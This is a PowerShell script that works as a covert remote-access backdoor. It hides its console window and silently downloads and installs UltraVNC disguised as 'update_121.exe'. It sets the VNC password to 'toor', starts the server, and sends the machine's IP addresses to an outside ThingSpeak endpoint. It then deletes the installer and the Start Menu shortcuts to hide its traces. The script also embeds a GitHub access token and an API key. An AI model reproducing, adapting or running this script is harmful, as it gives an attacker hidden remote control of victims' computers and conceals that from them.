Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] 
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '

$consoleHWND = [Console.Window]::GetConsoleWindow();
$consoleHWND
[Console.Window]::MoveWindow($consoleHWND,0,0,1,1);
#cd $Env:USERPROFILE -ErrorAction Stop
#Start-Sleep -Seconds 1 -ErrorAction Stop
$client = new-object System.Net.WebClient -ErrorAction Stop
#Start-Sleep -Seconds 1 -ErrorAction Stop
$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/update_121.exe?token=AHBRL73P3FFO2DQUKVUKC3TBHYIV4","$Env:USERPROFILE\update_121.exe") ;
#$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/ultravnc.ini","$Env:USERPROFILE\update_121.ini");
& $Env:USERPROFILE\update_121.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
#Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\uvnc bvba\UltraVNC\ultravnc.in' -ErrorAction Stop
Start-Sleep -Seconds 2 -ErrorAction Stop
& 'C:\Program Files\uvnc bvba\UltraVNC\setpasswd.exe' "toor";
#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
Start-Sleep -Seconds 1 -ErrorAction Stop
& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -run;
$ipa=$(ipconfig | where {$_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1]);
$ipa2 =(Test-Connection -ComputerName $env:computername -count 1).IPV4Address
$ipa3 =(Get-NetIPAddress -AddressState Preferred -AddressFamily IPv4 | Select-Object IPAddress | Out-String)
$url = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa&field2=$ipa2&field3=$ipa3";
(New-Object System.Net.WebClient).DownloadString($url)
Invoke-WebRequest $url -Method Get
Remove-Item "$Env:USERPROFILE\update_121.exe"
Remove-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\UltraVNC\' -Recurse
exit;


